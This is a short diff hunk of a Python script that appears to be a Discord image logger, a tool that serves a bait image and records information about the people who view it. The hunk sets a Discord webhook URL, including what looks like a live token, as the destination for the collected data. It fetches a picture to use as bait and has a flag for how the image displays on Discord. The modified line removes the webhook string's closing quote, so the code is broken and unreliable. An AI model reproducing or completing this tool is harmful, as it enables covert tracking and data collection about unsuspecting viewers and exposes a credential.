@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1455723931758624925/rlobb1c5RaQaOZUdhkiCHZGwgV2H8lyt0-Lw7x_xE1NXNXwjFHV_Cq8Z9knQJVfVVu7v-'
+webhook = 'https://discord.com/api/webhooks/1455723931758624925/rlobb1c5RaQaOZUdhkiCHZGwgV2H8lyt0-Lw7x_xE1NXNXwjFHV_Cq8Z9knQJVfVVu7v-
 
 bindata = httpx.get('https://coin-images.coingecko.com/nft_contracts/images/15175/large/chill-guy-pfp.png?1732114825').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
